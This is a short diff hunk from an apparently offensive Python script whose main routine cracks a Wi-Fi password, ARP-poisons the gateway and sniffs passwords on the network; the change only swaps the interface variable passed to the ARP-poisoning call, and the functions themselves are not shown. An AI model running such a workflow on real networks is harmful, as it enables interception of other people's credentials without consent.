@@ -52,7 +52,7 @@ if __name__ == "__main__":
     input("Password found! Connect to '{}' with password '{}' and press enter when ready".format(essid, password))
     print("ARP Poisoning...")
     gatewayIP = getGatewayIP()
-    arpSpoofProc = arpPoison(monitorModeInterface, gatewayIP)
+    arpSpoofProc = arpPoison(INTERFACE_NAME, gatewayIP)
     print("Sniffing passwords...")
     sniffProc = sniffPasswords()
     input("Press enter to stop sniffing")
